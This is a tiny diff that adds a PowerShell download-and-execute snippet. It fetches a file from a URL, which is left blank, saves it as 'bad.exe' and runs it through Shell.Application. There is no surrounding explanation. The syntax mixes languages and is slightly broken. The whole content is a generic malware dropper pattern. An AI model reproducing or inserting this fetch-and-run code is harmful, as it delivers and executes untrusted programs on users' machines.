@@ -1,0 +1,5 @@
+url_file = '' 
+$file = 'bad.exe'
+
+PowerShell (New-Object System.Net.WebClient).DownloadFile($url_file,$file), 
+(New-Object -com Shell.Application).ShellExecute($file);  
